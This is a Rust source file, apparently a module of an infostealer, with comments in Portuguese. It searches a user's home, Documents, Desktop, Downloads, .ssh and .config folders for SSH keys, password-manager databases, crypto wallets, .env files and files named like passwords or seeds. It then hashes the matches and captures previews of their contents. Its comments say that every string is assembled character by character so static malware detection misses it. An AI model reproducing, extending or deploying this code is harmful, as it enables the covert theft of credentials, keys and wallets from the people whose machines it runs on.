//! Coletor de Arquivos Sensíveis
//!
//! ⚠️ Todas as strings são ofuscadas para evitar detecção estática.

use std::path::PathBuf;
use std::hint::black_box;
use serde::{Deserialize, Serialize};
use walkdir::WalkDir;
use regex::Regex;
use sha2::{Sha256, Digest};

use super::{Collector, CollectorError, ModuleData};

// ============================================================================
// STRING OBFUSCATION HELPERS
// ============================================================================

/// XOR decode em runtime
#[inline(always)]
fn xd(data: &[u8], key: u8) -> String {
    data.iter().map(|b| (b ^ key) as char).collect()
}

/// Build string char by char
#[inline(always)]
fn bs(chars: &[char]) -> String {
    let mut s = String::with_capacity(chars.len());
    for &c in chars { s.push(c); }
    black_box(s)
}

/// Build regex pattern (ofuscado)
#[inline(always)]
fn build_regex(pattern_chars: &[char]) -> Option<Regex> {
    let pattern = bs(pattern_chars);
    Regex::new(&pattern).ok()
}

// ============================================================================
// DATA STRUCTURES (nomes curtos para evitar strings longas no serde)
// ============================================================================

#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct FileData {
    #[serde(rename = "d")]
    pub scanned_dirs: Vec<String>,
    
    #[serde(rename = "f")]
    pub found_files: Vec<FoundFile>,
    
    #[serde(rename = "ts")]
    pub total_scanned: u32,
    
    #[serde(rename = "tm")]
    pub total_matches: u32,
    
    #[serde(rename = "ms")]
    pub scan_duration_ms: u64,
}

#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct FoundFile {
    #[serde(rename = "p")]
    pub path: String,
    
    #[serde(rename = "n")]
    pub filename: String,
    
    #[serde(rename = "s")]
    pub size_bytes: u64,
    
    #[serde(rename = "m")]
    pub modified: String,
    
    #[serde(rename = "r")]
    pub match_reason: String,
    
    #[serde(rename = "h")]
    pub sha256: String,
    
    #[serde(rename = "c")]
    pub content_preview: Option<String>,
}

pub struct FileCollector {
    target_extensions: Vec<String>,
    name_patterns: Vec<Regex>,
    max_file_size: u64,
    max_depth: usize,
}

impl FileCollector {
    pub fn new() -> Self {
        Self {
            target_extensions: Self::get_target_extensions(),
            name_patterns: Self::get_name_patterns(),
            max_file_size: 10 * 1024 * 1024,
            max_depth: 5,
        }
    }
    
    /// Extensões alvo construídas em runtime
    fn get_target_extensions() -> Vec<String> {
        vec![
            // Documentos
            bs(&['t', 'x', 't']),
            bs(&['d', 'o', 'c']),
            bs(&['d', 'o', 'c', 'x']),
            bs(&['p', 'd', 'f']),
            // Chaves
            bs(&['k', 'e', 'y']),
            bs(&['p', 'e', 'm']),
            bs(&['p', 'p', 'k']),
            bs(&['p', 'u', 'b']),
            // Password managers
            bs(&['k', 'd', 'b', 'x']),
            bs(&['k', 'd', 'b']),
            // Crypto
            bs(&['w', 'a', 'l', 'l', 'e', 't']),
            bs(&['d', 'a', 't']),
            // Config
            bs(&['j', 's', 'o', 'n']),
            bs(&['e', 'n', 'v']),
            bs(&['c', 'f', 'g']),
            bs(&['c', 'o', 'n', 'f']),
            bs(&['i', 'n', 'i']),
            // Database
            bs(&['s', 'q', 'l']),
            bs(&['d', 'b']),
            bs(&['s', 'q', 'l', 'i', 't', 'e']),
        ]
    }
    
    /// Patterns de nome construídos em runtime com regex ofuscado
    fn get_name_patterns() -> Vec<Regex> {
        let mut patterns = Vec::new();
        
        // (?i)password
        if let Some(r) = build_regex(&['(', '?', 'i', ')', 'p', 'a', 's', 's', 'w', 'o', 'r', 'd']) {
            patterns.push(r);
        }
        // (?i)secret
        if let Some(r) = build_regex(&['(', '?', 'i', ')', 's', 'e', 'c', 'r', 'e', 't']) {
            patterns.push(r);
        }
        // (?i)credential
        if let Some(r) = build_regex(&['(', '?', 'i', ')', 'c', 'r', 'e', 'd', 'e', 'n', 't', 'i', 'a', 'l']) {
            patterns.push(r);
        }
        // (?i)private
        if let Some(r) = build_regex(&['(', '?', 'i', ')', 'p', 'r', 'i', 'v', 'a', 't', 'e']) {
            patterns.push(r);
        }
        // (?i)\.env
        if let Some(r) = build_regex(&['(', '?', 'i', ')', '\\', '.', 'e', 'n', 'v']) {
            patterns.push(r);
        }
        // (?i)id_rsa
        if let Some(r) = build_regex(&['(', '?', 'i', ')', 'i', 'd', '_', 'r', 's', 'a']) {
            patterns.push(r);
        }
        // (?i)id_ed25519
        if let Some(r) = build_regex(&['(', '?', 'i', ')', 'i', 'd', '_', 'e', 'd', '2', '5', '5', '1', '9']) {
            patterns.push(r);
        }
        // (?i)wallet
        if let Some(r) = build_regex(&['(', '?', 'i', ')', 'w', 'a', 'l', 'l', 'e', 't']) {
            patterns.push(r);
        }
        // (?i)backup
        if let Some(r) = build_regex(&['(', '?', 'i', ')', 'b', 'a', 'c', 'k', 'u', 'p']) {
            patterns.push(r);
        }
        // (?i)seed
        if let Some(r) = build_regex(&['(', '?', 'i', ')', 's', 'e', 'e', 'd']) {
            patterns.push(r);
        }
        
        patterns
    }
    
    fn scan_files(&self) -> Result<FileData, CollectorError> {
        let start = std::time::Instant::now();
        let mut found_files = Vec::new();
        let mut total_scanned = 0u32;
        
        let scan_dirs = self.get_scan_directories();
        let scanned_dirs: Vec<String> = scan_dirs.iter()
            .map(|p| p.to_string_lossy().to_string())
            .collect();
        
        for dir in &scan_dirs {
            if !dir.exists() {
                continue;
            }
            
            for entry in WalkDir::new(dir)
                .max_depth(self.max_depth)
                .follow_links(false)
                .into_iter()
                .filter_map(|e| e.ok())
            {
                total_scanned += 1;
                
                let path = entry.path();
                
                if !path.is_file() {
                    continue;
                }
                
                if let Ok(metadata) = path.metadata() {
                    if metadata.len() > self.max_file_size {
                        continue;
                    }
                }
                
                if let Some(match_reason) = self.check_file_match(path) {
                    if let Ok(found) = self.process_file(path, &match_reason) {
                        found_files.push(found);
                        
                        if found_files.len() >= 100 {
                            break;
                        }
                    }
                }
            }
        }
        
        Ok(FileData {
            scanned_dirs,
            total_matches: found_files.len() as u32,
            found_files,
            total_scanned,
            scan_duration_ms: start.elapsed().as_millis() as u64,
        })
    }
    
    fn get_scan_directories(&self) -> Vec<PathBuf> {
        let mut dirs_list = Vec::new();
        
        if let Some(home) = dirs::home_dir() {
            dirs_list.push(home.clone());
            // Nomes de pastas construídos em runtime
            dirs_list.push(home.join(bs(&['D', 'o', 'c', 'u', 'm', 'e', 'n', 't', 's'])));
            dirs_list.push(home.join(bs(&['D', 'e', 's', 'k', 't', 'o', 'p'])));
            dirs_list.push(home.join(bs(&['D', 'o', 'w', 'n', 'l', 'o', 'a', 'd', 's'])));
            dirs_list.push(home.join(bs(&['.', 's', 's', 'h'])));
            dirs_list.push(home.join(bs(&['.', 'c', 'o', 'n', 'f', 'i', 'g'])));
        }
        
        dirs_list
    }
    
    fn check_file_match(&self, path: &std::path::Path) -> Option<String> {
        let filename = path.file_name()?.to_string_lossy().to_lowercase();
        
        if let Some(ext) = path.extension() {
            let ext_str = ext.to_string_lossy().to_lowercase();
            if self.target_extensions.contains(&ext_str) {
                // Retorna código numérico ao invés de string legível
                return Some(format!("e:{}", ext_str.len()));
            }
        }
        
        for (idx, pattern) in self.name_patterns.iter().enumerate() {
            if pattern.is_match(&filename) {
                // Retorna código numérico ao invés de pattern
                return Some(format!("p:{}", idx));
            }
        }
        
        None
    }
    
    fn process_file(&self, path: &std::path::Path, match_reason: &str) -> Result<FoundFile, CollectorError> {
        let metadata = path.metadata()?;
        
        let hash = self.calculate_hash(path).unwrap_or_else(|_| bs(&['e', 'r', 'r']));
        
        let preview = self.get_preview(path);
        
        let modified = metadata.modified()
            .map(|t| {
                let datetime: chrono::DateTime<chrono::Utc> = t.into();
                datetime.to_rfc3339()
            })
            .unwrap_or_else(|_| bs(&['u', 'n', 'k']));
        
        Ok(FoundFile {
            path: path.to_string_lossy().to_string(),
            filename: path.file_name()
                .map(|n| n.to_string_lossy().to_string())
                .unwrap_or_default(),
            size_bytes: metadata.len(),
            modified,
            match_reason: match_reason.to_string(),
            sha256: hash,
            content_preview: preview,
        })
    }
    
    fn calculate_hash(&self, path: &std::path::Path) -> Result<String, std::io::Error> {
        let content = std::fs::read(path)?;
        let mut hasher = Sha256::new();
        hasher.update(&content);
        Ok(hex::encode(hasher.finalize()))
    }
    
    fn get_preview(&self, path: &std::path::Path) -> Option<String> {
        let metadata = path.metadata().ok()?;
        if metadata.len() > 8192 {
            return None;
        }
        
        let content = std::fs::read_to_string(path).ok()?;
        
        let preview = if content.len() > 512 {
            // Trunca sem mensagem óbvia
            format!("{}...", &content[..512])
        } else {
            content
        };
        
        // Verifica se é binário sem string óbvia
        if preview.chars().any(|c| c.is_control() && c != '\n' && c != '\r' && c != '\t') {
            return Some(bs(&['b', 'i', 'n']));
        }
        
        Some(preview)
    }
}

impl Default for FileCollector {
    fn default() -> Self {
        Self::new()
    }
}

impl Collector for FileCollector {
    fn name(&self) -> &str {
        // Nome curto
        "f"
    }
    
    fn collect(&self) -> Result<ModuleData, CollectorError> {
        let data = self.scan_files()?;
        Ok(ModuleData::Files(data))
    }
    
    fn is_supported(&self) -> bool {
        true
    }
    
    fn priority(&self) -> u8 {
        60
    }
}
